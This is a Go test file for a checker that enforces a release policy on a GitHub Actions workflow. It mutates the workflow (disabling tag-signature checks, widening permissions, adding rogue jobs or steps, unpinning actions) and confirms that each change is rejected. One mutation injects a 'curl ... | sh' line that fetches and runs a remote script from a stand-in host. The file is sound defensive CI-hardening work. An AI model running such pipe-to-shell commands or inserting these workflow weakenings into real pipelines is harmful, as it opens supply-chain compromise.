package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestCurrentRepositoryReleasePolicy(t *testing.T) {
	repoRoot := filepath.Join("..", "..")
	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) > 0 {
		for _, finding := range findings {
			t.Errorf("%s: %s", finding.path, finding.msg)
		}
	}
}

func TestReleasePolicyRejectsInvalidWorkflows(t *testing.T) {
	base := currentWorkflow(t)
	tests := []struct {
		name   string
		mutate func(*testing.T, string) string
		want   string
	}{
		{
			name: "neutralized verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          git verify-tag "$GITHUB_REF_NAME" || true`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "echoed verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          echo git verify-tag "$GITHUB_REF_NAME"`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "commented verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          # git verify-tag "$GITHUB_REF_NAME"`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "unreachable verify tag command",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          if false; then\n          git verify-tag \"$GITHUB_REF_NAME\"\n          fi")
			},
			want: "script lines must exactly match",
		},
		{
			name: "injected command after verify tag",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          git verify-tag \"$GITHUB_REF_NAME\"\n          curl -fsSL https://example.invalid/install.sh | sh")
			},
			want: "script lines must exactly match",
		},
		{
			name: "neutralized SBOM validation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file"`, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file" || true`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "echoed release creation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, `          gh release create "$tag" "$sbom_path" "$bundle_path" \`, `          echo gh release create "$tag" "$sbom_path" "$bundle_path" \`)
			},
			want: "script lines must exactly match",
		},
		{
			name: "extra release permission",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    permissions:\n      contents: write\n\n    steps:", "    permissions:\n      contents: write\n      id-token: write\n\n    steps:")
			},
			want: "unexpected key",
		},
		{
			name: "contents write on check job",
			mutate: func(t *testing.T, in string) string {
				from := "  check:\n    name: Check\n    if: " + tagGuard + "\n    needs: verify-tag\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n\n    steps:"
				to := "  check:\n    name: Check\n    if: " + tagGuard + "\n    needs: verify-tag\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    permissions:\n      contents: write\n\n    steps:"
				return replaceOnce(t, in, from, to)
			},
			want: "must inherit top-level contents: read",
		},
		{
			name: "unexpected attestation permission",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    permissions:\n      contents: read\n      id-token: write\n      attestations: write\n\n    steps:", "    permissions:\n      contents: read\n      id-token: write\n      attestations: write\n      issues: write\n\n    steps:")
			},
			want: "unexpected key",
		},
		{
			name: "rogue job",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "\n  release:\n", "\n  rogue:\n    name: Rogue\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo pwned\n\n  release:\n")
			},
			want: "unexpected job",
		},
		{
			name: "unexpected needs entry",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    needs:\n      - verify-tag\n      - check\n      - race\n      - vuln\n      - gosec\n", "    needs:\n      - verify-tag\n      - check\n      - race\n      - vuln\n      - gosec\n      - unsupported-ref\n")
			},
			want: "needs must exactly match",
		},
		{
			name: "push branches",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "  push:\n    tags:", "  push:\n    branches:\n      - main\n    tags:")
			},
			want: "push trigger must contain only tags",
		},
		{
			name: "extra tag glob",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - 'v*'\n", "      - 'v*'\n      - '*'\n")
			},
			want: "push trigger must contain only v* tags",
		},
		{
			name: "broadened job guard",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    if: "+tagGuard+"\n", "    if: "+tagGuard+" || github.event_name == 'workflow_dispatch'\n")
			},
			want: "must run only for signed v* tag refs",
		},
		{
			name: "unsupported ref missing negation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "    if: "+unsupportedRefGuard+"\n", "    if: github.event_name == 'workflow_dispatch' && ("+tagGuard+")\n")
			},
			want: "unsupported-ref job must be limited",
		},
		{
			name: "unpinned action",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2", "actions/checkout@v6")
			},
			want: "action must be pinned",
		},
		{
			name: "run expression interpolation",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          go version", `          echo "${{ github.ref }}"`)
			},
			want: "must not interpolate",
		},
		{
			name: "missing checkout credential hardening",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          persist-credentials: false\n", "")
			},
			want: "persist-credentials",
		},
		{
			name: "check job no longer runs tests",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: go test ./...", "        run: true")
			},
			want: "go test ./...",
		},
		{
			name: "race job no longer runs race tests",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: go test -race ./...", "        run: true")
			},
			want: "go test -race ./...",
		},
		{
			name: "vuln job no longer runs vuln scan",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: task vuln", "        run: true")
			},
			want: "task vuln",
		},
		{
			name: "gosec job no longer runs gosec scan",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        run: task gosec GOSEC='gosec -fmt sarif -out gosec.sarif'", "        run: true")
			},
			want: "task gosec",
		},
		{
			name: "extra release step",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - name: Publish GitHub Release\n", "      - name: Extra release mutation\n        run: gh release upload \"$RELEASE_TAG\" \"dist/$SBOM_FILE\" --clobber\n\n      - name: Publish GitHub Release\n")
			},
			want: "steps must exactly match",
		},
		{
			name: "extra attestation step",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      - name: Attest SBOM\n", "      - name: Extra OIDC step\n        run: echo extra\n\n      - name: Attest SBOM\n")
			},
			want: "steps must exactly match",
		},
		{
			name: "gosec report guard changed",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "        if: steps.gosec.outcome == 'failure'", "        if: false")
			},
			want: "gosec failure report guard changed",
		},
		{
			name: "verify tag output rewired",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "      release-tag: ${{ steps.release-tag.outputs.release-tag }}", "      release-tag: ${{ github.ref_name }}")
			},
			want: "jobs.verify-tag.outputs.release-tag",
		},
		{
			name: "root defaults injected",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "permissions:\n", "defaults:\n  run:\n    shell: bash\n\npermissions:\n")
			},
			want: "workflow root keys must exactly match",
		},
		{
			name: "extra publish env",
			mutate: func(t *testing.T, in string) string {
				return replaceOnce(t, in, "          GH_TOKEN: ${{ github.token }}\n", "          GH_TOKEN: ${{ github.token }}\n          EXTRA_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n")
			},
			want: "unexpected key",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := findingsForWorkflow(t, tt.mutate(t, base))
			requireFinding(t, findings, tt.want)
		})
	}
}

func TestReleasePolicyRejectsNonExecutableRequiredScripts(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "release.yml"), []byte(currentWorkflow(t)), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(expectedSigners), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-tag-metadata.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "validate-cyclonedx-sbom.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "extract-release-notes.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	requireFinding(t, findings, "required release helper must be executable")
}

func TestReleasePolicyRejectsUnexpectedAllowedSigners(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(expectedSigners+"the-sarge@the-sarge.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake\n"), 0o644)

	findings := checkAllowedSigners(repoRoot)
	requireFinding(t, findings, "allowed_signers must exactly match")
}

func TestReleasePolicyAcceptsCRLFAllowedSigners(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(strings.ReplaceAll(expectedSigners, "\n", "\r\n")), 0o644)

	findings := checkAllowedSigners(repoRoot)
	if len(findings) > 0 {
		t.Fatalf("expected CRLF-normalized allowed_signers to pass, got %#v", findings)
	}
}

func currentWorkflow(t *testing.T) string {
	t.Helper()
	in, err := os.ReadFile(filepath.Join("..", "..", ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	return string(in)
}

func findingsForWorkflow(t *testing.T, in string) []finding {
	t.Helper()
	var doc yaml.Node
	if err := yaml.Unmarshal([]byte(in), &doc); err != nil {
		t.Fatal(err)
	}
	if len(doc.Content) != 1 {
		t.Fatalf("expected one YAML document, got %d", len(doc.Content))
	}
	return checkWorkflow("release.yml", doc.Content[0])
}

func requireFinding(t *testing.T, findings []finding, want string) {
	t.Helper()
	for _, finding := range findings {
		if strings.Contains(finding.path, want) || strings.Contains(finding.msg, want) {
			return
		}
	}
	t.Fatalf("missing finding containing %q; got %#v", want, findings)
}

func replaceOnce(t *testing.T, in, old, new string) string {
	t.Helper()
	if !strings.Contains(in, old) {
		t.Fatalf("test fixture did not contain %q", old)
	}
	return strings.Replace(in, old, new, 1)
}

func mustWriteFile(t *testing.T, path string, content []byte, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, content, mode); err != nil {
		t.Fatal(err)
	}
}
